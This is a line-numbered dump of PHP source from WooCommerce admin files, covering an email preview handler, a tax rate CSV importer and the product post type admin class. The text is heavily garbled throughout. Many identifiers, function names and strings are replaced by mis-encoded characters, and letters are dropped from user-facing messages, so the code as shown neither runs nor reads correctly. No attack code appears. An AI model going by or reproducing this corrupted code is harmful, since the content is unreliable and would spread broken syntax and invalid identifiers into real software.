() {

102 iàĞ
	`is£t
Ğ
$_GET
['preview_woocommerce_mail'] ) ) {

103 iàĞ! 
	`wp_v”ify_nÚû
Ğ
$_REQUEST
['_wpnonce'], 'preview-mail') )

104 
	`d›
( 'Security check' );

106 
glob®
 
$ema_h—dšg
;

108 
	`ob_¡¬t
();

110 
	`šşude
( 'views/html-email-template-preview.php' );

112 
$ma”
 = 
	`WC
()->
	`ma”
();

113 
$mes§ge
 = 
	`ob_g‘_ş—n
();

114 
$ema_h—dšg
 = 
	`__
( 'HTML Email Template', 'woocommerce' );

116 
echo
 
$ma”
->
	`w¿p_mes§ge
Ğ
$ema_h—dšg
, 
$mes§ge
 );

117 
ex™
;

119 
	}
}

122  
Ãw
 
WC_Admš
();

	@includes/admin/importers/class-wc-tax-rate-importer.php

1 <?
php


11 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

13 iàĞ
şass_exi¡s
( 'WP_Importer' ) ) {

14 şas 
	cWC_Tax_R©e_ImpÜ‹r
 
ex‹nds
 
	gWP_ImpÜ‹r
 {

16 
v¬
 
	g$id
;

17 
v¬
 
	g$fe_u¾
;

18 
v¬
 
	g$impÜt_·ge
;

19 
v¬
 
	g$d–im™”
;

20 
v¬
 
	g$po¡s
 = 
¬¿y
();

21 
v¬
 
	g$impÜ‹d
;

22 
v¬
 
	g$sk³d
;

30 
public
 
funùiÚ
 
__cÚ¡ruù
() {

31 
	g$this
->
	gimpÜt_·ge
 = 'woocommerce_tax_rate_csv';

39 
funùiÚ
 
di¥©ch
() {

40 
	g$this
->
h—d”
();

42 iàĞ! 
em±y
Ğ
$_POST
['delimiter'] ) )

43 
	g$this
->
	gd–im™”
 = 
¡r¦ashes
Ğ
Œim
Ğ
$_POST
['delimiter'] ) );

45 iàĞ! 
	g$this
->
	gd–im™”
 )

46 
	g$this
->
	gd–im™”
 = ',';

48 
	g$¡•
 = 
em±y
Ğ
$_GET
['step'] ) ? 0 : () $_GET['step'];

49  
	g$¡•
 ) {

51 
$this
->
g»‘
();

54 
check_admš_»ã»r
( 'import-upload' );

55 iàĞ
	g$this
->
hªdË_u¶ßd
() ) {

57 iàĞ
	g$this
->
	gid
 )

58 
	g$fe
 = 
g‘_©ched_fe
Ğ
$this
->
id
 );

60 
	g$fe
 = 
ABSPATH
 . 
$this
->
fe_u¾
;

62 
add_f‹r
Ğ'h‰p_»que¡_timeout', 
¬¿y
Ğ
$this
, 'bump_request_timeout' ) );

64 iàĞ
funùiÚ_exi¡s
( 'gc_enable' ) )

65 
gc_’abË
();

67 @
£t_time_lim™
(0);

68 @
ob_æush
();

69 @
æush
();

71 
	g$this
->
impÜt
Ğ
$fe
 );

75 
	g$this
->
foÙ”
();

86 
funùiÚ
 
fÜm©_d©a_äom_csv
Ğ
$d©a
, 
$’c
 ) {

87  ( 
	g$’c
 =ğ'UTF-8' ) ? 
$d©a
 : 
utf8_’code
( $data );

97 
funùiÚ
 
impÜt
Ğ
$fe
 ) {

98 
glob®
 
	g$woocomm”û
, 
	g$wpdb
;

100 
	g$this
->
	gimpÜ‹d
 = 
$this
->
sk³d
 = 0;

102 iàĞ! 
is_fe
(
$fe
) ) {

103 
	gecho
 '<p><¡rÚg>' . 
__
( 'Sorry,here has been‡nƒrror.', 'woocommerce' ) . '</strong><br />';

104 
echo
 
__
( 'The file does‚otƒxist,…leasery‡gain.', 'woocommerce' ) . '</p>';

105 
	g$this
->
foÙ”
();

106 
d›
();

109 
	g$Ãw_¿‹s
 = 
¬¿y
();

111 
ši_£t
( 'auto_detect_line_endings', '1' );

113 iàĞĞ
	g$hªdË
 = 
fİ’
Ğ
$fe
, "r" ) ) !=ğ
FALSE
 ) {

115 
$h—d”
 = 
fg‘csv
Ğ
$hªdË
, 0, 
$this
->
d–im™”
 );

117 iàĞĞ
	g$h—d”
 ) == 10 ) {

119 
$loİ
 = 0;

121  ( 
	g$row
 = 
fg‘csv
Ğ
$hªdË
, 0, 
$this
->
d–im™”
 ) ) !=ğ
FALSE
 ) {

123 
li¡
Ğ
$couÁry
, 
$¡©e
, 
$po¡code
, 
$c™y
, 
$¿‹
, 
$Çme
, 
$´iÜ™y
, 
$compound
, 
$shpšg
, 
$şass
 ) = 
$row
;

125 
	g$couÁry
 = 
Œim
Ğ
¡¹ouµ”
Ğ
$couÁry
 ) );

126 
	g$¡©e
 = 
Œim
Ğ
¡¹ouµ”
Ğ
$¡©e
 ) );

128 iàĞ
	g$couÁry
 == '*' )

129 
$couÁry
 = '';

130 iàĞ
	g$¡©e
 == '*' )

131 
$¡©e
 = '';

132 iàĞ
	g$şass
 == 'standard' )

133 
$şass
 = '';

135 
	g$wpdb
->
š£¹
(

136 
$wpdb
->
´efix
 . "woocommerce_tax_rates",

137 
¬¿y
(

138 'x_¿‹_couÁry' => 
$couÁry
,

139 'x_¿‹_¡©e' => 
$¡©e
,

140 'x_¿‹' => 
wc_fÜm©_decim®
Ğ
$¿‹
, 4 ),

141 'x_¿‹_Çme' => 
Œim
Ğ
$Çme
 ),

142 'x_¿‹_´iÜ™y' => 
absšt
Ğ
$´iÜ™y
 ),

143 'x_¿‹_compound' => 
$compound
 ? 1 : 0,

144 'x_¿‹_shpšg' => 
$shpšg
 ? 1 : 0,

145 'x_¿‹_Üd”' => 
$loİ
,

146 'x_¿‹_şass' => 
§n™ize_t™Ë
Ğ
$şass
 )

150 
	g$x_¿‹_id
 = 
$wpdb
->
š£¹_id
;

152 
	g$po¡code
 = 
wc_ş—n
Ğ
$po¡code
 );

153 
	g$po¡codes
 = 
ex¶ode
Ğ';', 
$po¡code
 );

154 
	g$po¡codes
 = 
¬¿y_m­
Ğ'¡¹ouµ”',‡¼ay_m­Ğ'wc_ş—n', 
$po¡codes
 ) );

155 
fÜ—ch
Ğ
$po¡codes
 
as
 
$po¡code
 ) {

156 iàĞ! 
em±y
Ğ
$po¡code
 ) && 
	g$po¡code
 != '*' ) {

157 
$wpdb
->
š£¹
(

158 
$wpdb
->
´efix
 . "woocommerce_tax_rate_locations",

159 
¬¿y
(

160 'loÿtiÚ_code' => 
$po¡code
,

161 'x_¿‹_id' => 
$x_¿‹_id
,

168 
	g$c™y
 = 
wc_ş—n
Ğ
$c™y
 );

169 
	g$c™›s
 = 
ex¶ode
Ğ';', 
$c™y
 );

170 
	g$c™›s
 = 
¬¿y_m­
Ğ'¡¹ouµ”',‡¼ay_m­Ğ'wc_ş—n', 
$c™›s
 ) );

171 
fÜ—ch
Ğ
$c™›s
 
as
 
$c™y
 ) {

172 iàĞ! 
em±y
Ğ
$c™y
 ) && 
	g$c™y
 != '*' ) {

173 
$wpdb
->
š£¹
(

174 
$wpdb
->
´efix
 . "woocommerce_tax_rate_locations",

175 
¬¿y
(

176 'loÿtiÚ_code' => 
$c™y
,

177 'x_¿‹_id' => 
$x_¿‹_id
,

184 
	g$loİ
 ++;

185 
	g$this
->
	gimpÜ‹d
++;

190 
	gecho
 '<p><¡rÚg>' . 
__
( 'Sorry,here has been‡nƒrror.', 'woocommerce' ) . '</strong><br />';

191 
echo
 
__
( 'The CSV is invalid.', 'woocommerce' ) . '</p>';

192 
	g$this
->
foÙ”
();

193 
d›
();

197 
fşo£
Ğ
$hªdË
 );

201 
	gecho
 '<div class="updated settings-error below-h2"><p>

202 '.¥rštfĞ__Ğ'
ImpÜt
 
	gcom¶‘e
 - 
	gimpÜ‹d
 <
	g¡rÚg
>%
	gs
</¡rÚg> 
x
 
¿‹s
 
ªd
 
	gsk³d
 <¡rÚg>%s</¡rÚg>.', '
	gwoocomm”û
' ), $this->imported, $this->skipped ).'

203 </
	gp
></
	gdiv
>';

205 
	g$this
->
impÜt_’d
();

211 
funùiÚ
 
impÜt_’d
() {

212 
	gecho
 '<p>' . 
__
Ğ'AÎ dÚe!', 'woocomm”û' ) . ' <¨h»f="' . 
admš_u¾
('admin.php?page=wc-settings&tab=tax') . '">' . __( 'View Tax Rates', 'woocommerce' ) . '</a>' . '</p>';

214 
do_aùiÚ
( 'import_end' );

223 
funùiÚ
 
hªdË_u¶ßd
() {

225 iàĞ
em±y
Ğ
$_POST
['file_url'] ) ) {

227 
	g$fe
 = 
wp_impÜt_hªdË_u¶ßd
();

229 iàĞ
is£t
Ğ
$fe
['error'] ) ) {

230 
	gecho
 '<p><¡rÚg>' . 
__
( 'Sorry,here has been‡nƒrror.', 'woocommerce' ) . '</strong><br />';

231 
echo
 
esc_html
Ğ
$fe
['error'] ) . '</p>';

232  
	gçl£
;

235 
	g$this
->
	gid
 = (è
$fe
['id'];

239 iàĞ
fe_exi¡s
Ğ
ABSPATH
 . 
$_POST
['file_url'] ) ) {

241 
	g$this
->
	gfe_u¾
 = 
esc_©Œ
Ğ
$_POST
['file_url'] );

245 
	gecho
 '<p><¡rÚg>' . 
__
( 'Sorry,here has been‡nƒrror.', 'woocommerce' ) . '</strong></p>';

246  
	gçl£
;

252  
	gŒue
;

261 
funùiÚ
 
h—d”
() {

262 
	gecho
 '<div class="wrap"><div class="icon32 icon32-woocommerce-importer" id="icon-woocommerce"><br></div>';

263 
	gecho
 '<h2>' . 
__
( 'Import Tax Rates', 'woocommerce' ) . '</h2>';

272 
funùiÚ
 
foÙ”
() {

273 
	gecho
 '</div>';

282 
funùiÚ
 
g»‘
() {

284 
	gecho
 '<div class="narrow">';

285 
	gecho
 '<p>' . 
__
( 'Hihere! Upload‡ CSV file containingax„ateso importhe contents into your shop. Choose‡ .csv fileo upload,hen click "Upload file‡nd import".', 'woocommerce' ).'</p>';

287 
	gecho
 '<p>' . 
¥rštf
Ğ
__
Ğ'Tax„©e ÃedØbdefšed w™h cŞumn š‡ s³cifiøÜd” (10 cŞumns). <¨h»f="%s">Click h”tØdowÆßd‡ sam¶e</a>.', 'woocomm”û' ), 
WC
()->
¶ugš_u¾
() . '/dummy-data/sample_tax_rates.csv' ) . '</p>';

289 
	g$aùiÚ
 = 'admin.php?import=woocommerce_tax_rate_csv&step=1';

291 
	g$by‹s
 = 
­¶y_f‹rs
Ğ'impÜt_u¶ßd_size_lim™', 
wp_max_u¶ßd_size
() );

292 
	g$size
 = 
size_fÜm©
Ğ
$by‹s
 );

293 
	g$u¶ßd_dœ
 = 
wp_u¶ßd_dœ
();

294 iàĞ! 
em±y
Ğ
$u¶ßd_dœ
['error'] ) ) :

295 ?><
div
 
şass
="”rÜ"><
p
><?
php
 
_e
Ğ'BefÜyou cª u¶ßd you¸impÜˆfe, you wÈÃedØfixhfŞlowšgƒ¼Ü:', 'woocomm”û' ); ?></
	gp
>

296 <
	gp
><
	g¡rÚg
><?
php
 
echo
 
	g$u¶ßd_dœ
['”rÜ']; ?></¡rÚg></p></
	gdiv
><?php

299 <
fÜm
 
’ùy³
="muÉ¬t/fÜm-d©a" 
id
="impÜt-u¶ßd-fÜm" 
m‘hod
="po¡" 
aùiÚ
="<?phpƒchoƒsc_attr(wp_nonce_url($action, 'import-upload')); ?>">

300 <
bË
 
şass
="form-table">

301 <
tbody
>

302 <
Œ
>

303 <
th
>

304 <
Ïb–
 ="u¶ßd"><?
php
 
_e
Ğ'Choo£‡ fäom you¸compu‹r:', 'woocomm”û' ); ?></
	gÏb–
>

305 </
	gth
>

306 <
	gtd
>

307 <
šput
 
	gty³
="fe" 
id
="u¶ßd" 
Çme
="impÜt" 
size
="25" />

308 <
šput
 
ty³
="hidd’" 
Çme
="aùiÚ" 
v®ue
="save" />

309 <
šput
 
ty³
="hidd’" 
Çme
="max_fe_size" 
v®ue
="<?phpƒcho $bytes; ?>" />

310 <
sm®l
><?
php
 
´štf
Ğ
__
('Maximum size: %s', 'woocomm”û' ), 
$size
 ); ?></
	gsm®l
>

311 </
	gtd
>

312 </
	gŒ
>

313 <
	gŒ
>

314 <
	gth
>

315 <
Ïb–
 ="fe_u¾"><?
php
 
_e
Ğ'ORƒÁ”…©hØfe:', 'woocomm”û' ); ?></
	gÏb–
>

316 </
	gth
>

317 <
	gtd
>

318 <?
php
 
	gecho
 ' ' . 
	gABSPATH
 . ' '; ?><
šput
 
	gty³
="‹xt" 
id
="fe_u¾" 
Çme
="fe_u¾" 
size
="25" />

319 </
td
>

320 </
Œ
>

321 <
Œ
>

322 <
th
><
Ïb–
><?
php
 
_e
Ğ'D–im™”', 'woocomm”û' ); ?></
	gÏb–
><
	gbr
/></
	gth
>

323 <
	gtd
><
šput
 
	gty³
="‹xt" 
Çme
="d–im™”" 
¶aûhŞd”
="," 
size
="2" /></
td
>

324 </
Œ
>

325 </
tbody
>

326 </
bË
>

327 <
p
 
şass
="submit">

328 <
šput
 
ty³
="subm™" 
şass
="bu‰Ú" 
v®ue
="<?phpƒsc_attr_e( 'Upload file‡nd import', 'woocommerce' ); ?>" />

329 </
p
>

330 </
fÜm
>

331 <?
php


332 
’dif
;

334 
	gecho
 '</div>';

342 
funùiÚ
 
bump_»que¡_timeout
Ğ
$v®
 ) {

	@includes/admin/post-types/class-wc-admin-cpt-product.php

1 <?
php


11 iàĞ! 
defšed
( 'ABSPATH' ) ) {

12 
	gex™
;

15 iàĞ! 
şass_exi¡s
( 'WC_Admin_CPT' ) ) {

16 
šşude
( 'class-wc-admin-cpt.php' );

19 iàĞ! 
şass_exi¡s
( 'WC_Admin_CPT_Product' ) ) :

24 şas 
	cWC_Admš_CPT_Produù
 
ex‹nds
 
WC_Admš_CPT
 {

29 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

30 
$this
->
ty³
 = 'product';

33 
	`add_f‹r
Ğ'’‹r_t™Ë_h”e', 
	`¬¿y
Ğ
$this
, 'enter_title_here' ), 1, 2 );

36 
	`add_f‹r
Ğ'g‘‹xt', 
	`¬¿y
Ğ
$this
, 'featured_image_gettext' ) );

37 
	`add_f‹r
Ğ'medŸ_v›w_¡ršgs', 
	`¬¿y
Ğ
$this
, 'media_view_strings' ), 10, 2 );

40 
	`add_aùiÚ
Ğ'po¡_subm™box_misc_aùiÚs', 
	`¬¿y
Ğ
$this
, 'product_data_visibility' ) );

43 
	`add_aùiÚ
Ğ'´e_po¡_upd©e', 
	`¬¿y
Ğ
$this
, 'pre_post_update' ) );

44 
	`add_f‹r
Ğ'wp_š£¹_po¡_d©a', 
	`¬¿y
Ğ
$this
, 'wp_insert_post_data' ) );

47 
	`add_f‹r
Ğ'mªage_ed™-´oduù_cŞumns', 
	`¬¿y
Ğ
$this
, 'edit_columns' ) );

48 
	`add_aùiÚ
Ğ'mªage_´oduù_po¡s_cu¡om_cŞumn', 
	`¬¿y
Ğ
$this
, 'custom_columns' ), 2 );

49 
	`add_f‹r
Ğ'mªage_ed™-´oduù_sÜbË_cŞumns', 
	`¬¿y
Ğ
$this
, 'custom_columns_sort' ) );

50 
	`add_f‹r
Ğ'»que¡', 
	`¬¿y
Ğ
$this
, 'custom_columns_orderby' ) );

53 
	`add_f‹r
Ğ'v›ws_ed™-´oduù', 
	`¬¿y
Ğ
$this
, 'default_sorting_link' ) );

56 
	`add_aùiÚ
Ğ'»¡riù_mªage_po¡s', 
	`¬¿y
Ğ
$this
, 'product_filters' ) );

57 
	`add_f‹r
Ğ'·r£_qu”y', 
	`¬¿y
Ğ
$this
, 'product_filters_query' ) );

60 
	`add_f‹r
Ğ'po¡s_£¬ch', 
	`¬¿y
Ğ
$this
, 'product_search' ) );

63 
	`add_f‹r
Ğ'wp_‹rms_checkli¡_¬gs', 
	`¬¿y
Ğ
$this
, 'disable_checked_ontop' ) );

66 
	`add_aùiÚ
Ğ'bulk_ed™_cu¡om_box', 
	`¬¿y
Ğ
$this
, 'bulk_edit' ), 10, 2 );

67 
	`add_aùiÚ
Ğ'quick_ed™_cu¡om_box', 
	`¬¿y
Ğ
$this
, 'quick_edit' ), 10, 2 );

68 
	`add_aùiÚ
Ğ'§ve_po¡', 
	`¬¿y
Ğ
$this
, 'bulk_and_quick_edit_save_post' ), 10, 2 );

71 
	`add_f‹r
Ğ'u¶ßd_dœ', 
	`¬¿y
Ğ
$this
, 'upload_dir' ) );

72 
	`add_aùiÚ
Ğ'medŸ_u¶ßd_dowÆßdabË_´oduù', 
	`¬¿y
Ğ
$this
, 'media_upload_downloadable_product' ) );

73 
	`add_f‹r
Ğ'mod_»wr™e_ruËs', 
	`¬¿y
Ğ
$this
, 'ms_protect_download_rewite_rules' ) );

76 
	`add_aùiÚ
Ğ'woocomm”û_´oûss_´oduù_fe_dowÆßd_·ths', 
	`¬¿y
Ğ
$this
, 'process_product_file_download_paths' ), 10, 3 );

79 
·»Á
::
	`__cÚ¡ruù
();

86 
´iv©e
 
funùiÚ
 
	$is_ed™šg_´oduù
() {

87 iàĞ! 
	`em±y
Ğ
$_GET
['post_type'] ) && 'product' == $_GET['post_type'] ) {

88  
Œue
;

90 iàĞ! 
	`em±y
Ğ
$_GET
['po¡'] ) && '´oduù' =ğ
	`g‘_po¡_ty³
( $_GET['post'] ) ) {

91  
Œue
;

93 iàĞ! 
	`em±y
Ğ
$_REQUEST
['po¡_id'] ) && '´oduù' =ğ
	`g‘_po¡_ty³
( $_REQUEST['post_id'] ) ) {

94  
Œue
;

96  
çl£
;

97 
	}
}

104 
public
 
funùiÚ
 
ã©u»d_image_g‘‹xt
Ğ
$¡ršg
 = '' ) {

105 iàĞ'F—tu»d Image' =ğ
$¡ršg
 && 
$this
->
is_ed™šg_´oduù
() ) {

106 
$¡ršg
 = 
__
( 'Product Image', 'woocommerce' );

107 } 
–£if
 ( 'Removã©u»d image' =ğ
$¡ršg
 && 
$this
->
is_ed™šg_´oduù
() ) {

108 
$¡ršg
 = 
__
( 'Remove…roduct image', 'woocommerce' );

109 } 
–£if
 ( 'S‘ f—tu»d image' =ğ
$¡ršg
 && 
$this
->
is_ed™šg_´oduù
() ) {

110 
$¡ršg
 = 
__
( 'Set…roduct image', 'woocommerce' );

112  
	g$¡ršg
;

121 
public
 
funùiÚ
 
medŸ_v›w_¡ršgs
Ğ
$¡ršgs
 = 
¬¿y
(), 
$po¡
 = 
nuÎ
 ) {

122 iàĞ
is_objeù
Ğ
$po¡
 ) ) {

123 iàĞ'´oduù' =ğ
$po¡
->
po¡_ty³
 ) {

124 
$¡ršgs
['£tF—tu»dImageT™Ë'] = 
__
( 'Set…roduct image', 'woocommerce' );

125 
	g$¡ršgs
['£tF—tu»dImage'] = 
__
( 'Set…roduct image', 'woocommerce' );

128  
	g$¡ršgs
;

137 
public
 
funùiÚ
 
	$’‹r_t™Ë_h”e
Ğ
$‹xt
, 
$po¡
 ) {

138 iàĞ
$po¡
->
po¡_ty³
 == 'product' ) {

139  
	`__
( 'Product‚ame', 'woocommerce' );

142  
$‹xt
;

143 
	}
}

151 
public
 
funùiÚ
 
	$´oduù_d©a_visib™y
() {

152 
glob®
 
$po¡
;

154 iàĞ'´oduù' !ğ
$po¡
->
po¡_ty³
 ) {

158 
$cu¼’t_visib™y
 = ( $cu¼’t_visib™y = 
	`g‘_po¡_m‘a
Ğ
$po¡
->
ID
, '_visib™y', 
Œue
 ) ) ? $current_visibility : 'visible';

159 
$cu¼’t_ã©u»d
 = ( $cu¼’t_ã©u»d = 
	`g‘_po¡_m‘a
Ğ
$po¡
->
ID
, '_ã©u»d', 
Œue
 ) ) ? $current_featured : 'no';

161 
$visib™y_İtiÚs
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_´oduù_visib™y_İtiÚs', 
	`¬¿y
(

162 'visibË' => 
	`__
( 'Catalog/search', 'woocommerce' ),

163 'ÿlog' => 
	`__
( 'Catalog', 'woocommerce' ),

164 '£¬ch' => 
	`__
( 'Search', 'woocommerce' ),

165 'hidd’' => 
	`__
( 'Hidden', 'woocommerce' )

168 <
div
 
şass
="misc-pub-£ùiÚ" 
id
="catalog-visibility">

169 <?
php
 
	`_e
Ğ'C©®og visib™y:', 'woocomm”û' ); ?> <
¡rÚg
 
id
="catalog-visibility-display"><?php

170 
echo
 
	`is£t
Ğ
$visib™y_İtiÚs
[ 
$cu¼’t_visib™y
 ] ) ? 
	`esc_html
( $visibility_options[ $current_visibility ] ) :ƒsc_html( $current_visibility );

172 iàĞ'yes' =ğ
$cu¼’t_ã©u»d
 ) {

173 
echo
 ', ' . 
	`__
( 'Featured', 'woocommerce' );

175 ?></
¡rÚg
>

177 <
a
 
h»f
="#ÿlog-visib™y" 
şass
="ed™-ÿlog-visib™y hide-if-no-js"><?
php
 
	`_e
( 'Edit', 'woocommerce' ); ?></a>

179 <
div
 
id
="ÿlog-visib™y-£Ëù" 
şass
="hide-if-js">

181 <
šput
 
ty³
="hidd’" 
Çme
="cu¼’t_visib™y" 
id
="cu¼’t_visib™y" 
v®ue
="<?phpƒchoƒsc_attr( $current_visibility ); ?>" />

182 <
šput
 
ty³
="hidd’" 
Çme
="cu¼’t_ã©u»d" 
id
="cu¼’t_ã©u»d" 
v®ue
="<?phpƒchoƒsc_attr( $current_featured ); ?>" />

184 <?
php


185 
echo
 '<p>' . 
	`__
( 'Definehe†oopshis…roduct should be visible in. The…roduct will still be‡ccessible directly.', 'woocommerce' ) . '</p>';

187 
	`fÜ—ch
 ( 
$visib™y_İtiÚs
 
as
 
$Çme
 => 
$Ïb–
 ) {

188 
echo
 '<špuˆty³="¿dio"‚ame="_visib™y" id="_visib™y_' . 
	`esc_©Œ
Ğ
$Çme
 ) . '" v®ue="' .ƒsc_©ŒĞ$Çmè. '" ' . 
	`checked
Ğ
$cu¼’t_visib™y
, $Çme, 
çl£
 ) . ' d©a-Ïb–="' .ƒsc_©ŒĞ
$Ïb–
 ) . '" /> <Ïb– fÜ="_visib™y_' .ƒsc_©ŒĞ$Çmè. '" cÏss="£Ëù™">' . 
	`esc_html
( $label ) . '</label><br />';

191 
echo
 '<p>' . 
	`__
( 'Enablehis optiono featurehis…roduct.', 'woocommerce' ) . '</p>';

193 
echo
 '<špuˆty³="checkbox"‚ame="_ã©u»d" id="_ã©u»d" ' . 
	`checked
Ğ
$cu¼’t_ã©u»d
, 'yes', 
çl£
 ) . ' /> <Ïb– fÜ="_ã©u»d">' . 
	`__
( 'Featured Product', 'woocommerce' ) . '</label><br />';

195 <
p
>

196 <
a
 
h»f
="#ÿlog-visib™y" 
şass
="§ve-po¡-visib™y hide-if-no-j bu‰Ú"><?
php
 
	`_e
( 'OK', 'woocommerce' ); ?></a>

197 <
a
 
h»f
="#ÿlog-visib™y" 
şass
="ÿnûl-po¡-visib™y hide-if-no-js"><?
php
 
	`_e
( 'Cancel', 'woocommerce' ); ?></a>

198 </
p
>

199 </
div
>

200 </
div
>

201 <?
php


202 
	}
}

209 
public
 
funùiÚ
 
	$´e_po¡_upd©e
Ğ
$po¡_id
 ) {

210 iàĞ
	`is£t
Ğ
$_POST
['_visibility'] ) ) {

211 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_visib™y', 
	`¡r¦ashes
Ğ
$_POST
['_visibility'] ) );

214 iàĞ
	`is£t
Ğ
$_POST
['_stock_status'] ) ) {

215 
	`wc_upd©e_´oduù_¡ock_¡©us
Ğ
$po¡_id
, 
	`wc_ş—n
Ğ
$_POST
['_stock_status'] ) );

217 
	}
}

225 
public
 
funùiÚ
 
	$wp_š£¹_po¡_d©a
Ğ
$d©a
 ) {

226 
glob®
 
$po¡
;

228 iàĞ'´oduù' =ğ
$d©a
['po¡_ty³'] && 
	`is£t
Ğ
$_POST
['product-type'] ) ) {

229 
$´oduù_ty³
 = 
	`¡r¦ashes
Ğ
$_POST
['product-type'] );

230  
$´oduù_ty³
 ) {

233 
$d©a
['post_parent'] = 0;

241  
$d©a
;

242 
	}
}

247 
public
 
funùiÚ
 
	$ed™_cŞumns
Ğ
$exi¡šg_cŞumns
 ) {

249 iàĞ
	`em±y
Ğ
$exi¡šg_cŞumns
 ) && ! 
	`is_¬¿y
( $existing_columns ) ) {

250 
$exi¡šg_cŞumns
 = 
	`¬¿y
();

253 
	`un£t
Ğ
$exi¡šg_cŞumns
['title'], $existing_columns['comments'], $existing_columns['date'] );

255 
$cŞumns
 = 
	`¬¿y
();

256 
$cŞumns
['cb'] = '<inputype="checkbox" />';

257 
$cŞumns
['thumb'] = '<¥ª cÏss="wc-imagts" d©a-t="' . 
	`__
( 'Image', 'woocommerce' ) . '">' . __( 'Image', 'woocommerce' ) . '</span>';

259 
$cŞumns
['Çme'] = 
	`__
( 'Name', 'woocommerce' );

261 iàĞ
	`wc_´oduù_sku_’abËd
() ) {

262 
$cŞumns
['sku'] = 
	`__
( 'SKU', 'woocommerce' );

265 iàĞ'yes' =ğ
	`g‘_İtiÚ
( 'woocommerce_manage_stock' ) ) {

266 
$cŞumns
['is_š_¡ock'] = 
	`__
( 'Stock', 'woocommerce' );

269 
$cŞumns
['´iû'] = 
	`__
( 'Price', 'woocommerce' );

271 
$cŞumns
['´oduù_ÿt'] = 
	`__
( 'Categories', 'woocommerce' );

272 
$cŞumns
['´oduù_g'] = 
	`__
( 'Tags', 'woocommerce' );

273 
$cŞumns
['ã©u»d'] = '<¥ª cÏss="wc-ã©u»ds" d©a-t="' . 
	`__
( 'Featured', 'woocommerce' ) . '">' . __( 'Featured', 'woocommerce' ) . '</span>';

274 
$cŞumns
['´oduù_ty³'] = '<¥ª cÏss="wc-ty³s" d©a-t="' . 
	`__
( 'Type', 'woocommerce' ) . '">' . __( 'Type', 'woocommerce' ) . '</span>';

275 
$cŞumns
['d©e'] = 
	`__
( 'Date', 'woocommerce' );

277  
	`¬¿y_m”ge
Ğ
$cŞumns
, 
$exi¡šg_cŞumns
 );

278 
	}
}

284 
public
 
funùiÚ
 
	$cu¡om_cŞumns
Ğ
$cŞumn
 ) {

285 
glob®
 
$po¡
, 
$woocomm”û
, 
$the_´oduù
;

287 iàĞ
	`em±y
Ğ
$the_´oduù
 ) || $the_´oduù->
id
 !ğ
$po¡
->
ID
 ) {

288 
$the_´oduù
 = 
	`g‘_´oduù
Ğ
$po¡
 );

291  
$cŞumn
 ) {

293 
echo
 '<¨h»f="' . 
	`g‘_ed™_po¡_lšk
Ğ
$po¡
->
ID
 ) . '">' . 
$the_´oduù
->
	`g‘_image
() . '</a>';

296 
$ed™_lšk
 = 
	`g‘_ed™_po¡_lšk
Ğ
$po¡
->
ID
 );

297 
$t™Ë
 = 
	`_d¿á_Ü_po¡_t™Ë
();

298 
$po¡_ty³_objeù
 = 
	`g‘_po¡_ty³_objeù
Ğ
$po¡
->
po¡_ty³
 );

299 
$ÿn_ed™_po¡
 = 
	`cu¼’t_u£r_ÿn
Ğ
$po¡_ty³_objeù
->
ÿp
->
ed™_po¡
, 
$po¡
->
ID
 );

301 
echo
 '<¡rÚg><¨şass="row-t™Ë" h»f="' . 
	`esc_u¾
Ğ
$ed™_lšk
 ) .'">' . 
$t™Ë
.'</a>';

303 
	`_po¡_¡©es
Ğ
$po¡
 );

305 
echo
 '</strong>';

307 iàĞ
$po¡
->
po¡_·»Á
 > 0 ) {

308 
echo
 '&nb¥;&nb¥;&Ï¼; <¨h»f="'. 
	`g‘_ed™_po¡_lšk
Ğ
$po¡
->
po¡_·»Á
 ) .'">'. 
	`g‘_the_t™Ë
( $post->post_parent ) .'</a>';

312 iàĞ
	`is£t
Ğ
$_GET
['mode'] ) && 'excerpt' == $_GET['mode'] ) {

313 
echo
 
	`­¶y_f‹rs
Ğ'the_exû½t', 
$po¡
->
po¡_exû½t
 );

317 
$aùiÚs
 = 
	`¬¿y
();

319 
$aùiÚs
['id'] = 'ID: ' . 
$po¡
->
ID
;

321 iàĞ
$ÿn_ed™_po¡
 && 'Œash' !ğ
$po¡
->
po¡_¡©us
 ) {

322 
$aùiÚs
['ed™'] = '<¨h»f="' . 
	`g‘_ed™_po¡_lšk
Ğ
$po¡
->
ID
, 
Œue
 ) . '"™Ë="' . 
	`esc_©Œ
Ğ
	`__
( 'Edithis item', 'woocommerce' ) ) . '">' . __( 'Edit', 'woocommerce' ) . '</a>';

323 
$aùiÚs
['šlšhide-if-no-js'] = '<¨h»f="#" cÏss="ed™šlše"™Ë="' . 
	`esc_©Œ
Ğ
	`__
( 'Edithis item inline', 'woocommerce' ) ) . '">' . __( 'Quick&nbsp;Edit', 'woocommerce' ) . '</a>';

325 iàĞ
	`cu¼’t_u£r_ÿn
Ğ
$po¡_ty³_objeù
->
ÿp
->
d–‘e_po¡
, 
$po¡
->
ID
 ) ) {

326 iàĞ'Œash' =ğ
$po¡
->
po¡_¡©us
 ) {

327 
$aùiÚs
['uÁ¿sh'] = '<¨t™Ë="' . 
	`esc_©Œ
Ğ
	`__
Ğ'Re¡Üthi ™em fromhT¿sh', 'woocomm”û' ) ) . '" h»f="' . 
	`wp_nÚû_u¾
Ğ
	`admš_u¾
Ğ
	`¥rštf
Ğ
$po¡_ty³_objeù
->
_ed™_lšk
 . '&amp;aùiÚ=uÁ¿sh', 
$po¡
->
ID
 ) ), 'untrash-post_' . $post->ID ) . '">' . __( 'Restore', 'woocommerce' ) . '</a>';

328 } 
	`–£if
 ( 
EMPTY_TRASH_DAYS
 ) {

329 
$aùiÚs
['Œash'] = '<¨şass="subm™d–‘e"™Ë="' . 
	`esc_©Œ
Ğ
	`__
Ğ'Movthi ™emØthT¿sh', 'woocomm”û' ) ) . '" h»f="' . 
	`g‘_d–‘e_po¡_lšk
Ğ
$po¡
->
ID
 ) . '">' . __( 'Trash', 'woocommerce' ) . '</a>';

332 iàĞ'Œash' =ğ
$po¡
->
po¡_¡©us
 || ! 
EMPTY_TRASH_DAYS
 ) {

333 
$aùiÚs
['d–‘e'] = '<¨şass="subm™d–‘e"™Ë="' . 
	`esc_©Œ
Ğ
	`__
Ğ'D–‘thi ™em…”mª’y', 'woocomm”û' ) ) . '" h»f="' . 
	`g‘_d–‘e_po¡_lšk
Ğ
$po¡
->
ID
, '', 
Œue
 ) . '">' . __( 'Delete Permanently', 'woocommerce' ) . '</a>';

